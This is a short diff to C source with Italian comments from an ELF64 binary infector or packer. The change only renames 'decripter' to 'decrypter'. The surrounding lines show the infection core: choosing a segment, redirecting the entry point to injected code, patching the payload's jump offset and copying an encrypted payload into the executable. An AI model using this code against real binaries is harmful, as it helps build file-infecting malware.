@@ -74,12 +74,12 @@ int		find_section_to_infect64(Elf64_Phdr *phdr, int n_phdr, size_t size_payload)
 }
 
 /**
- * Inserisce i campi necessari per il funzionamento del Decripter nel payload
+ * Inserisce i campi necessari per il funzionamento del Decrypter nel payload
  * @param binary struttura del binario
  * @param payload struttura del payload
  * @param start nuovo punto di accesso dell'eseguibile
  */
-void 	insert_decripter_in_payload(t_mem_image *binary, t_mem_image *payload, Elf64_Off start)
+void 	insert_decrypter_in_payload(t_mem_image *binary, t_mem_image *payload, Elf64_Off start)
 {
 	size_t		size_text = 0;
 	int			index_section = 0;
@@ -118,7 +118,7 @@ void 	insert_payload64(Elf64_Phdr *phdr, int i, t_mem_image *binary, t_mem_image
 	// Modifico gli ultimi 4 byte del payload che si riferiscono alla funzione jmp
 	*(Elf64_Word*)(payload->addr + payload->size - 4) = (Elf64_Word)offset;
 	ehdr->e_entry = start;
-	insert_decripter_in_payload(binary, payload, start);
+	insert_decrypter_in_payload(binary, payload, start);
 	// Inserisco il payload nel binario
 	memcpy(binary->addr + phdr[i].p_offset + phdr[i].p_filesz, payload->addr, payload->size);
 	phdr[i].p_filesz += payload->size;
